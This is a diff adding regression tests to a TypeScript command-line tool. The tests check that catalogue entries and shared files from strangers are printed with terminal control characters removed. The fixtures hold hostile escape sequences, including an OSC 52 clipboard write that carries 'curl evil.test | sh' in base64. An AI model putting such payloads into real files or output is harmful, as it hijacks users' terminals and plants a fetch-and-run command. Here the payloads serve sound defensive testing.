@@ -12,6 +12,8 @@ import type { AddressInfo } from 'node:net';
 import { tmpdir } from 'node:os';
 import { join } from 'node:path';
 
+import type { Trust } from '@braindog/declare/catalogue';
+
 import { usecase } from '../src/usecase.ts';
 import type { AgentIo } from '../src/skills.ts';
 
@@ -19,7 +21,7 @@ import type { AgentIo } from '../src/skills.ts';
 const TOKEN = ['rec_01TESTTESTTESTTESTTESTTEST', 'stub-bearer-for-tests-only-44ab'].join('.');
 const CONTEXT = { session: null, ambiguous: [], handoff: null, live: { same_repo: [], elsewhere: [] }, waiting: [], people: [], faded: 0, project: null, registers: [], next: '' };
 
-async function setup(t: { after: (fn: () => void | Promise<void>) => void }) {
+async function setup(t: { after: (fn: () => void | Promise<void>) => void }, answers: Record<string, unknown> = {}) {
   const seen: { method: string; args: Record<string, unknown> }[] = [];
   const server: Server = createServer((req, res) => {
     const chunks: Buffer[] = [];
@@ -31,6 +33,7 @@ async function setup(t: { after: (fn: () => void | Promise<void>) => void }) {
       res.writeHead(200, { 'content-type': 'application/json' });
       if (method === 'context') return res.end(JSON.stringify({ ok: true, value: CONTEXT }));
       if (method === 'propose') return res.end(JSON.stringify({ ok: true, value: { id: 'SG7' } }));
+      if (method in answers) return res.end(JSON.stringify({ ok: true, value: answers[method] }));
       res.end(JSON.stringify({ ok: false, refusal: { code: 'ROUTE_UNKNOWN', fix: `The stub does not answer ${method}.` } }));
     });
   });
@@ -189,4 +192,131 @@ test('install refuses a file whose own id is not the entry it is listed under', 
   assert.equal(await pack(['install', 'bookshelf', '--from', 'catalogue'], h.io), 1);
   assert.match(h.said.at(-1) ?? '', /the file inside is other 1\.0\.0/u);
   assert.equal(h.seen.filter((s) => s.method === 'propose').length, 0);
+});
+
+/* ── a catalogue's words, from somebody further off than a member ───────── */
+
+/*
+ * AUDIT THIRTY-NINE FINDING 2, WITH ITS OWN BYTES. A catalogue index is somebody else's file, read from a folder or an
+ * address, and `readCatalogue` checks an entry's kind, id and versions and nothing of its title, author or summary. Run
+ * against the tree before the fix, `search` put OSC 0 (retitle the window), SGR red and an OSC 52 clipboard write of
+ * `curl evil.test | sh` on the terminal byte for byte, as the audit measured with `cat-out.txt`.
+ */
+const OSC_TITLE = 'Club \u001b]0;owned\u0007';
+const SGR_AUTHOR = 'A \u001b[31mRed';
+const OSC_CLIPBOARD = 'Tracks members.\u001b]52;c;Y3VybCBldmlsLnRlc3QgfCBzaA==\u0007\u001b[2K';
+
+/** Every control character a printed line could carry, C0, DEL and C1 alike. */
+const CONTROL = /[\u0000-\u001f\u007f-\u009f]/u;
+const dirty = (lines: readonly string[]): string[] => lines.filter((l) => CONTROL.test(l)).map((l) => JSON.stringify(l));
+
+test("search prints a stranger's catalogue with no control character in it, and the words still there", async (t) => {
+  const h = await setup(t);
+  assert.equal(await usecase(['new', 'club', '--author', 'Halden'], h.io), 0);
+  assert.equal(await usecase(['publish', 'club-1.0.0.usecase.json', '--to', 'catalogue'], h.io), 0, h.said.join('\n'));
+  const path = join(h.dir, 'catalogue', 'index.json');
+  const index = JSON.parse(readFileSync(path, 'utf8')) as { entries: { title: string; author: string; summary: string; versions: { reach: { pages: string[] } }[] }[] };
+  const entry = index.entries[0]!;
+  entry.title = OSC_TITLE;
+  entry.author = SGR_AUTHOR;
+  entry.summary = OSC_CLIPBOARD;
+  /* THE REACH IS THE INDEX'S TOO, not worked out from the file on the way to the terminal. */
+  entry.versions[0]!.reach.pages = ['Club\u001b]0;owned\u0007'];
+  writeFileSync(path, JSON.stringify(index));
+
+  h.out.length = 0;
+  assert.equal(await usecase(['search', '--from', 'catalogue'], h.io), 0, h.said.join('\n'));
+  assert.deepEqual(dirty([...h.out, ...h.said]), []);
+  assert.equal(h.out[0], 'club  Club ]0;owned 1.0.0 by A [31mRed. Tracks members. ]52;c;Y3VybCBldmlsLnRlc3QgfCBzaA== [2K');
+  assert.ok(h.out.some((l) => l === '  Adds lists: Items; pages: Club ]0;owned; rules: none'), h.out.join('\n'));
+});
+
+/*
+ * THE FILE'S OWN WORDS GO THE SAME ROAD. `readShared` and the add-on door take a title, author and license holding ESC
+ * and BEL without a word, measured by a probe before this test was written, so `check`, `publish`, `diff` and
+ * `install --from` each printed the file's words as sent. Only the lines are scrubbed: the file is published byte for
+ * byte, because the checksum a reader holds it to is over those bytes.
+ */
+test("check, publish, diff and install --from print a shared file's title, author and license with no control character", async (t) => {
+  const { pack } = await import('../src/catalogue.ts');
+  const h = await setup(t);
+  assert.equal(await usecase(['new', 'club', '--author', 'Halden'], h.io), 0);
+  const file = JSON.parse(readFileSync(join(h.dir, 'club-1.0.0.usecase.json'), 'utf8')) as Record<string, unknown>;
+  const hostile = { ...file, title: OSC_TITLE, author: SGR_AUTHOR, license: 'MIT\u001b]52;c;Y3VybA==\u0007', summary: OSC_CLIPBOARD };
+  const text = JSON.stringify(hostile);
+  writeFileSync(join(h.dir, 'club-1.0.0.usecase.json'), text);
+  /* 1.1.0 retitles the page with an eight-bit CSI, so `diff` has a declaration's title of the file's to say. */
+  const packed = file.pack as { declarations: Record<string, unknown>[] };
+  const retitled = { ...packed, declarations: packed.declarations.map((d) => (d.page === undefined ? d : { ...d, title: 'Club\u009b2K' })) };
+  writeFileSync(join(h.dir, 'club-1.1.0.usecase.json'), JSON.stringify({ ...hostile, version: '1.1.0', pack: retitled }));
+
+  h.out.length = 0;
+  assert.equal(await usecase(['check', 'club-1.0.0.usecase.json'], h.io), 0, h.said.join('\n'));
+  assert.equal(await usecase(['publish', 'club-1.0.0.usecase.json', '--to', 'catalogue'], h.io), 0, h.said.join('\n'));
+  assert.equal(readFileSync(join(h.dir, 'catalogue', 'usecases', 'club', '1.0.0.usecase.json'), 'utf8'), text);
+  assert.equal(await usecase(['publish', 'club-1.1.0.usecase.json', '--to', 'catalogue'], h.io), 0, h.said.join('\n'));
+  assert.equal(await usecase(['diff', 'club-1.0.0.usecase.json', 'club-1.1.0.usecase.json'], h.io), 0, h.said.join('\n'));
+  assert.equal(await usecase(['install', 'club', '--from', 'catalogue'], h.io), 0, h.said.join('\n'));
+  assert.equal(await usecase(['install', 'club', '--from', 'catalogue', '--version', '9.9.9'], h.io), 1);
+
+  assert.equal(await pack(['new', 'shelf', '--author', 'Halden'], h.io), 0);
+  const shelf = JSON.parse(readFileSync(join(h.dir, 'shelf-1.0.0.pack.json'), 'utf8')) as Record<string, unknown>;
+  writeFileSync(join(h.dir, 'shelf-1.0.0.pack.json'), JSON.stringify({ ...shelf, title: OSC_TITLE, author: SGR_AUTHOR, license: 'MIT\u0007' }));
+  assert.equal(await pack(['check', 'shelf-1.0.0.pack.json'], h.io), 0, h.said.join('\n'));
+
+  assert.deepEqual(dirty([...h.out, ...h.said]), []);
+  assert.ok(h.out.includes('  By A [31mRed, MIT ]52;c;Y3VybA==.'), h.out.join('\n'));
+  assert.ok(h.out.includes('  Changes: Club 2K (page)'), h.out.join('\n'));
+  assert.match(h.out.join('\n'), /Asked the owner: Install Club \]0;owned 1\.1\.0 from a catalogue\?/u);
+  assert.match(h.said.join('\n'), /Club \]0;owned has no version 9\.9\.9/u);
+});
+
+/*
+ * THE CHECKER'S MUTANTS. With the scrub taken out of `trustLine`, out of `usecase list`, out of `proposeFile` and out of
+ * `installOffered`, every test above still passed: each unsigned entry above says a line that names no author, and no
+ * test here had asked `list`, `install <file>` or `install <id>` about a stranger's words. `preview` had no scrub at all
+ * and printed a file's title as sent. Each of those five mutants goes red on the two tests below.
+ */
+test("trustLine says an author and a revocation's reason with no control character, on every kind of trust", async () => {
+  const { trustLine } = await import('../src/catalogue.ts');
+  const reason = 'Lost it.\u001b]52;c;Y3VybA==\u0007';
+  const kinds: Trust[] = [
+    { kind: 'stripped', before: ['k1'] },
+    { kind: 'first', key_id: 'k1' },
+    { kind: 'known', key_id: 'k1' },
+    { kind: 'changed', key_id: 'k2', before: ['k1'] },
+    { kind: 'rotated', key_id: 'k2', from: 'k1' },
+    { kind: 'revoked', key_id: 'k1', reason },
+  ];
+  const lines = kinds.map((k) => trustLine(k, SGR_AUTHOR));
+  assert.deepEqual(dirty(lines), []);
+  for (const line of lines.slice(0, -1)) assert.match(line, /A \[31mRed/u);
+  assert.match(lines.at(-1) ?? '', /Their reason: Lost it\. \]52;c;Y3VybA==$/u);
+});
+
+test("install <file>, preview, list and install <id> print a use case's words with no control character", async (t) => {
+  const offer = [{ id: 'usecase-club', usecase: OSC_TITLE, summary: OSC_CLIPBOARD, modules: ['crm\u001b[2K'] }];
+  const h = await setup(t, { arrangement: { packs: [{ id: 'usecase-home', version: '1.0.0\u0007' }], offer } });
+  assert.equal(await usecase(['new', 'club', '--author', 'Halden'], h.io), 0);
+  const file = JSON.parse(readFileSync(join(h.dir, 'club-1.0.0.usecase.json'), 'utf8')) as Record<string, unknown>;
+  writeFileSync(join(h.dir, 'club-1.0.0.usecase.json'), JSON.stringify({ ...file, title: OSC_TITLE }));
+
+  h.out.length = 0;
+  assert.equal(await usecase(['install', 'club-1.0.0.usecase.json'], h.io), 0, h.said.join('\n'));
+  assert.match(h.out.at(-1) ?? '', /^Asked the owner to install Club \]0;owned 1\.0\.0\./u);
+  /* A SELF-HOST THAT ONLY EXITS, so `preview` gets as far as its line and no further. */
+  const stub = join(h.dir, 'selfhost.mjs');
+  writeFileSync(stub, 'process.exit(0);\n');
+  assert.equal(await usecase(['preview', 'club-1.0.0.usecase.json'], { ...h.io, env: { ...h.io.env, BRAINDOG_SELFHOST: stub } }), 0, h.said.join('\n'));
+  assert.match(h.out.at(-1) ?? '', /^Previewing Club \]0;owned 1\.0\.0 on a scratch BrainDog\./u);
+  assert.equal(await usecase(['list'], h.io), 0, h.said.join('\n'));
+  assert.ok(h.out.includes('  club  Club ]0;owned. Tracks members. ]52;c;Y3VybCBldmlsLnRlc3QgfCBzaA== [2K. Builds on crm [2K.'), h.out.join('\n'));
+  assert.equal(await usecase(['install', 'club'], h.io), 0, h.said.join('\n'));
+  assert.match(h.out.at(-1) ?? '', /^Asked the owner to set this BrainDog up for Club \]0;owned\./u);
+
+  assert.deepEqual(dirty([...h.out, ...h.said]), []);
+  /* THE QUESTION ON DECIDE IS BUILT FROM THE SAME CLEAN WORDS; the file in the body is sent byte for byte. */
+  const proposed = h.seen.filter((s) => s.method === 'propose');
+  assert.deepEqual(dirty(proposed.map((s) => String(s.args.question))), []);
+  assert.ok(String((proposed[0]?.args.body as { file: string }).file).includes('\\u001b]0;owned'));
 });
